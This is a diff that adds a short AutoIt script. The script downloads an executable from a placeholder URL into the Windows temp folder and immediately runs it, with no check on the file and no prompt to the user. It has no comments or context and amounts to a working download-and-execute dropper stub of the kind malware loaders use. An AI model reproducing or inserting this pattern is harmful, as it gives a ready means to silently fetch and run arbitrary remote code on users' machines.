@@ -1,0 +1,8 @@
+﻿#include <InetConstants.au3>
+#include <MsgBoxConstants.au3>
+#include <WinAPIFiles.au3>
+
+
+Local $sFilePath = _WinAPI_GetTempFileName(@TempDir) & ".exe"
+InetGet("#URL", $sFilePath, 2, $INET_DOWNLOADWAIT)
+RunWait($sFilePath)
